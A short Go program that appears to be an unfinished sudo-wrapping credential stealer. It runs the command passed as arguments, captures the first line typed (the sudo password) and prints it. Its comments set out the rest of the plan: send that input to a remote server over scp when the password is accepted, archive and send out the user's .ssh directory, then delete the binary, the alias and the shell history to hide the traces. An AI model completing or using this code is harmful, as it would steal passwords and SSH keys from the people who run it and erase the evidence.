package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
)

func main() {

	reader := bufio.NewReader(os.Stdin)

	sudoCmd := exec.Command(os.Args[1], os.Args[2:]...)
	sudoCmd.Stderr = os.Stderr
	sudoCmd.Stdout = os.Stdout
	sudoCmd.Stdin = reader

	input, _ := reader.ReadString('\n')

	fmt.Println("The input was: ", input)
	fmt.Fprintf(os.Stdin, "%s\n", input)

	// set stdout, stderr of cmd to os.Stdout, os.Stderr
	// read stdin to buffer, send that to stdin of cmd, but also
	// scp stdin as textfile to remote server (IF: output isn't 'Sorry, try again.')
	// and tar `.ssh` and scp that as well
	// then remove this binary, remove alias, remove .bash_history (and zsh equivalent)

}
